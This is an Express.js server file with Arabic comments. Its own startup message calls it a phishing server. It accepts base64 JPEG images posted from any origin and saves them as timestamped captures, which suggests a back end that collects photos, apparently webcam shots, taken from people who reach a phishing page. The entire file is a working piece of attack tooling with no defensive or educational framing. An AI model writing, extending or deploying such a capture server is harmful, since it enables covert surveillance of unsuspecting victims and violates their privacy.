 const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '10mb' }));

// مجلد لحفظ الصور
const uploadDir = './captures';
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

app.post('/upload', (req, res) => {
    try {
        const base64 = req.body.image.replace(/^data:image\/jpeg;base64,/, '');
        const filename = path.join(uploadDir, `capture_${Date.now()}.jpg`);
        fs.writeFileSync(filename, base64, 'base64');
        console.log(`📸 صورة جديدة: ${filename}`);
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ error: 'فشل الحفظ' });
    }
});
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});
app.listen(3000, () => {
    console.log('✅ خادم التصيد يعمل على http://localhost:3000');
    console.log('📁 الصور ستُحفظ في مجلد captures/');
});
